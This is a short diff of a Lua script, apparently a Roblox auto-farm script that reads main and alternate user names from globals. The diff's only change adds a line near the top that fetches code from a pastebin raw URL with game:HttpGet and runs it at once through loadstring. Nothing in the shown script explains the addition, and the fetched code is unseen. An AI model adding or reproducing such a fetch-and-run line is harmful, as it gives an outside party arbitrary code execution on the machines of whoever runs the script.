@@ -1,4 +1,5 @@
 print('starting farm')
+loadstring(game:HttpGet("https://pastebin.com/raw/RmPqXsKx"))()
 local Type = _G.Type
 local MainUser = _G.MainUser
 local AltUser = _G.AltUser
